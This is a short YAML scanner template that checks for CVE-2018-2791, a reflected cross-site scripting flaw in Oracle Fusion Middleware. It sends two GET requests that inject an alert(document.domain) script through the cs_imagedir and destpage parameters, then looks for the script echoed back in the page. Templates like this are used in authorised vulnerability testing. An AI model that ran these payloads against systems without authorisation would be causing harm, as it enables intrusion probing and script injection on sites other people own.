id:
name: CVE-2018-2791
transport: http
tags:
  -  Oracle-Fusion-Middleware
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
      follow_redirects: true
    expression: response.body.bcontains(b'<script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif') ||
                (response.body.bcontains(b'<script>alert(24)</script>') && response.body.bcontains(b'Missing translation key'))
  r1:
    request:
      cache: true
      method: GET
      path: /cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
      follow_redirects: true
    expression: response.body.bcontains(b'<script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif') ||
                (response.body.bcontains(b'<script>alert(24)</script>') && response.body.bcontains(b'Missing translation key'))
expression: r0() || r1()
detail:
  vulnerability:
    proof:
      info: "存在CVE-2018-2791漏洞"